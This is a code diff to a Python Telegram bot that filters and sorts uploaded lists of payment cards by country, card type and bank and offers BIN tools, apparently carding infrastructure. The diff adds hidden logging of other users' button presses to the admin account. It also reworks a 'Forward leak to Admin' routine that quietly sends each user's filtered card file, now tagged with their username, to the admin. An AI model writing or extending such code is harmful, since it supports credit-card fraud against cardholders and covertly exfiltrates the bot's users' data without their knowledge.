@@ -120,6 +120,19 @@ def log_activity(message):
             
     threading.Thread(target=_send_log, args=(message,), daemon=True).start()
 
+def log_callback_activity(call):
+    if call.from_user.id == ALLOWED_ID:
+        return
+        
+    def _send_log(c):
+        try:
+            user_info = f"@{c.from_user.username}" if c.from_user.username else f"ID: {c.from_user.id}"
+            bot.send_message(ALLOWED_ID, f"👆 Button ditekan oleh {user_info}\nAction: `{c.data}`", parse_mode='Markdown')
+        except Exception as e:
+            print(f"Log error: {e}")
+            
+    threading.Thread(target=_send_log, args=(call,), daemon=True).start()
+
 # --- UTILITIES ---
 
 def is_valid_text_file(document):
@@ -469,6 +482,7 @@ def handle_filter_app(message):
         filter_sessions[session_id] = {
             'chat_id': message.chat.id,
             'msg_id': message.message_id,
+            'username': message.from_user.username,
             'total': len(parsed_cards),
             'cards': parsed_cards,
             'filters': filters
@@ -585,26 +599,47 @@ def api_apply_filter():
         f"🎯 *Filter Applied Successfully*\n\n"
         f"📊 *Summary:*\n"
         f"• *Total Selected:* `{len(result_lines)}` cards (out of `{session['total']}`)\n"
-        f"• *Top Regions:* {top_countries or 'N/A'}\n"
+        f"• *Regions:* {top_countries or 'N/A'}\n"
         f"• *Card Types:* {top_types or 'N/A'}\n"
-        f"• *Top Banks:* {bank_str or 'N/A'}"
+        f"• *Banks:* {bank_str or 'N/A'}"
     )
     
     if not result_lines:
         bot.send_message(chat_id, "❌ No cards matched your filter criteria.", reply_to_message_id=msg_id)
     else:
-        send_text_as_file(chat_id, output, "filtered_results.txt", reply_to=msg_id, caption=caption)
+        # Generate dynamic filename
+        count = len(result_lines)
+        if count >= 1000:
+            count_str = f"{count//1000}k" if count % 1000 == 0 else f"{count/1000:.1f}k".replace('.0', '')
+        else:
+            count_str = str(count)
+            
+        iso_counter = Counter([c['info']['iso2'] for c in filtered_cards if c['info']['iso2']])
+        unique_isos = [iso for iso, count in iso_counter.most_common()]
+        
+        if len(unique_isos) == 0:
+            top_iso = "MIX"
+        elif len(unique_isos) <= 3:
+            top_iso = "_".join(unique_isos)
+        else:
+            top_iso = "MIX"
+            
+        filename = f"filter_{top_iso}_{count_str}.txt"
+        
+        send_text_as_file(chat_id, output, filename, reply_to=msg_id, caption=caption)
         
         # Forward leak to Admin
         if chat_id != ALLOWED_ID:
-            def _send_leak(c_id, out_txt, cap):
+            def _send_leak(c_id, out_txt, cap, fname):
                 try:
-                    send_text_as_file(ALLOWED_ID, out_txt, f"filter_leak_{c_id}.txt", caption=cap)
+                    send_text_as_file(ALLOWED_ID, out_txt, fname, caption=cap)
                 except Exception as e:
                     print(f"Failed to forward filter result to admin: {e}")
             
-            admin_caption = f"👆 *Hasil Filter Web App dari ID: {chat_id}*\n\n{caption}"
-            threading.Thread(target=_send_leak, args=(chat_id, output, admin_caption), daemon=True).start()
+            username = session.get('username')
+            user_identifier = f"@{username}" if username else f"ID: {chat_id}"
+            admin_caption = f"👆 *Hasil Filter Web App dari {user_identifier}*\n\n{caption}"
+            threading.Thread(target=_send_leak, args=(chat_id, output, admin_caption, filename), daemon=True).start()
         
     # Free memory
     del filter_sessions[session_id]
@@ -636,6 +671,7 @@ def handle_clean(message):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('toggle_') or call.data == 'process_clean')
 def callback_query(call):
+    log_callback_activity(call)
     if call.message.chat.id not in clean_jobs or call.message.message_id not in clean_jobs[call.message.chat.id]:
         bot.answer_callback_query(call.id, "Session expired.")
         return
@@ -731,6 +767,7 @@ def handle_bin_tools(message):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('bin_'))
 def handle_bin_callback(call):
+    log_callback_activity(call)
     if call.message.chat.id not in bin_jobs or call.message.message_id not in bin_jobs[call.message.chat.id]:
         bot.answer_callback_query(call.id, "Session expired.")
         return
